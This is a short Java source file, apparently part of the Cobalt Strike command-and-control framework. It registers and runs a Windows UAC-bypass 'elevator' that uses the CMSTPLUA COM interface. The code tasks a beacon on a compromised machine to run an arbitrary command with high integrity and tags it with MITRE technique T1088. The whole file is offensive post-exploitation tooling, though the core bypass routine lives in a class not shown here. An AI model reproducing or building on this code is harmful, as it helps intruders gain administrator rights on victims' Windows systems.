package beacon.elevators;

import aggressor.AggressorClient;
import aggressor.DataUtils;
import beacon.BeaconElevators;
import beacon.TaskBeacon;
import beacon.inline.RunAsAdminCMSTP;

public class BypassUACCMSTPLUA implements BeaconElevators.Elevator {
    protected AggressorClient client;

    public BypassUACCMSTPLUA(AggressorClient aggressorClient) {
        this.client = aggressorClient;
        DataUtils.getBeaconElevators(aggressorClient.getData()).register("uac-cmstplua", "Bypass UAC with CMSTPLUA COM interface", this);
    }

    public void runasadmin(String string1, String string2) {
        (new TaskBeacon(this.client, new String[0])).log_task(string1, "Tasked beacon to run " + string2 + " in a high integrity context (uac-cmstplua)", "T1088");
        (new RunAsAdminCMSTP(this.client, string2)).go(string1);
    }
}
